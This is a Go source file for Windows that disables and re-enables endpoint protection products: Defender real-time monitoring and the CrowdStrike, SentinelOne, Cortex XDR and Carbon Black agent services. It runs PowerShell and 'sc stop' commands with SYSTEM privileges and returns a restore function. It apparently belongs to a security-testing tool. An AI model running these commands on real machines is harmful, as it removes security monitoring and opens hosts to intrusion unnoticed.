//go:build windows

package disabler

import (
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// vendorDisableMap maps vendor display names to their disable/enable PowerShell commands.
// Commands run as SYSTEM so they have full privilege.
var vendorDisableMap = map[string]vendorActions{
	"Microsoft Defender": {
		disable: [][]string{
			{"powershell", "-NoProfile", "-NonInteractive", "-Command",
				"Set-MpPreference -DisableRealtimeMonitoring $true"},
		},
		enable: [][]string{
			{"powershell", "-NoProfile", "-NonInteractive", "-Command",
				"Set-MpPreference -DisableRealtimeMonitoring $false"},
		},
	},
	"Cortex XDR": {
		disable: [][]string{
			{"sc", "stop", "CyveraService"},
			{"sc", "stop", "CyveraKernel"},
		},
		enable: [][]string{
			{"sc", "start", "CyveraService"},
			{"sc", "start", "CyveraKernel"},
		},
	},
	"CrowdStrike Falcon": {
		disable: [][]string{
			{"sc", "stop", "CSFalconService"},
		},
		enable: [][]string{
			{"sc", "start", "CSFalconService"},
		},
	},
	"SentinelOne": {
		disable: [][]string{
			{"sc", "stop", "SentinelAgent"},
		},
		enable: [][]string{
			{"sc", "start", "SentinelAgent"},
		},
	},
	"Carbon Black": {
		disable: [][]string{
			{"sc", "stop", "CbDefenseService"},
		},
		enable: [][]string{
			{"sc", "start", "CbDefenseService"},
		},
	},
}

type vendorActions struct {
	disable [][]string
	enable  [][]string
}

// DisableResult holds the outcome of a disable attempt.
type DisableResult struct {
	Vendor   string
	Disabled bool
	Notes    string
}

// Disable temporarily disables the specified vendor's protection.
// It returns a DisableResult and a restore function — always call restore() when done.
func Disable(vendor string) (DisableResult, func()) {
	// Normalize: case-insensitive partial match
	actions, matched := findActions(vendor)
	if matched == "" {
		return DisableResult{
			Vendor:   vendor,
			Disabled: false,
			Notes:    fmt.Sprintf("No disable recipe found for vendor: %q", vendor),
		}, func() {}
	}

	notes := []string{}
	allOk := true

	for _, cmd := range actions.disable {
		out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
		if err != nil {
			notes = append(notes, fmt.Sprintf("WARN: %s → %v (%s)", strings.Join(cmd, " "), err, strings.TrimSpace(string(out))))
			allOk = false
		} else {
			notes = append(notes, fmt.Sprintf("OK: %s", strings.Join(cmd[1:], " ")))
		}
	}

	// Wait briefly for the services to actually stop
	time.Sleep(3 * time.Second)

	restore := func() {
		_ = Enable(matched)
	}

	return DisableResult{
		Vendor:   matched,
		Disabled: allOk,
		Notes:    strings.Join(notes, "; "),
	}, restore
}

// Enable re-enables the specified vendor's protection.
// It is idempotent — safe to call even if the vendor is already running.
func Enable(vendor string) error {
	actions, matched := findActions(vendor)
	if matched == "" {
		return fmt.Errorf("no enable recipe found for vendor: %q", vendor)
	}
	for _, cmd := range actions.enable {
		out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
		if err != nil {
			return fmt.Errorf("%s → %v (%s)", strings.Join(cmd, " "), err, strings.TrimSpace(string(out)))
		}
	}
	// Wait for services to restart
	time.Sleep(3 * time.Second)
	return nil
}

// findActions does a case-insensitive partial match on the vendor map.
func findActions(vendor string) (vendorActions, string) {
	normalized := strings.ToLower(vendor)
	for key, actions := range vendorDisableMap {
		if strings.Contains(normalized, strings.ToLower(key)) ||
			strings.Contains(strings.ToLower(key), normalized) {
			return actions, key
		}
	}
	return vendorActions{}, ""
}

// SupportedVendors returns the list of vendors that can be auto-disabled.
func SupportedVendors() []string {
	vendors := make([]string, 0, len(vendorDisableMap))
	for k := range vendorDisableMap {
		vendors = append(vendors, k)
	}
	return vendors
}
